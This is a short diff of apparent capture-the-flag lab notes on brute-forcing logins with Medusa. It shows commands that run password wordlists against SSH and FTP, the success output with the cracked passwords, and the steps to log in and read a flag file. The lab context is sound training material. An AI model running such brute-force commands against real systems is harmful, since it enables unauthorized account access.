@@ -11,10 +11,10 @@ The following command serves as our starting point:
 - medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 ### LAB
 - medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
-ACCOUNT FOUND: [ssh] Host: 94.237.120.137 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
+- ACCOUNT FOUND: [ssh] Host: 94.237.120.137 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
 - ssh sshuser@<IP> -p PORT
 - medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
-ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
+- ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
 - ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
 - ftp> ls /
 - ftp> more flag.txt
